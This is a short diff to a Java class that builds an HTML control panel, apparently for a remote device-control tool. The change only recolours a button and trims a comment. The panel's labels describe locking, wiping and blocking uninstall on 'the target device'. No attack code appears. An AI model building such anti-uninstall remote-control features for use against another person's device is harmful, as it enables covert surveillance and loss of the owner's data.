@@ -415,10 +415,10 @@ public class GhostModule extends BaseModule {
         html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
         html.append("</div>");
 
-        // 6. Device Admin Elevation Section (Purple Card - Matching Blackout Protocol Button Style)
+        // 6. Device Admin Elevation Section
         html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
         html.append("<div class=\"info-label\" style=\"color: #a855f7; font-size: 0.8rem; font-weight: bold; letter-spacing: 1px;\">ADMIN_ELEVATION <span class=\"info-trigger\" style=\"border-color: rgba(168, 85, 247, 0.5); color: #a855f7;\" onclick=\"showInfo(event, 'ADMIN_ELEVATION', 'Enforce Device Administration policies on the target device. Grants elevated system administration protocols including remote instant screen locking, emergency data wipe, and anti-uninstall protection.')\">INFO</span></div>");
-        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.1); font-weight: bold;\">ELEVATE_ADMIN</button>");
+        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); font-weight: bold;\">ELEVATE_ADMIN</button>");
         html.append("</div>");
         
         html.append("</div></div>");
